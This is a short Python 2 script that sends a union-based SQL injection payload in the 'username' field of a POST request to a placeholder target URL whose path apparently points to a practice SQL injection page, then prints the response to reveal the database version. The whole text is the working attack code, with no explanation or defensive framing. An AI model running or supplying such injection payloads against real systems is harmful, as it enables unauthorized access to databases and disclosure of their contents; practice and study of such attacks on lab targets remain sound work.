import urllib, urllib2, cookielib, requests
url = "http://target.com/sqli/sqli.php"
response = requests.post("http://target.com/sqli/sqli.php",{'username': "' union all select 1,@@version,1 -- +"})
print response.content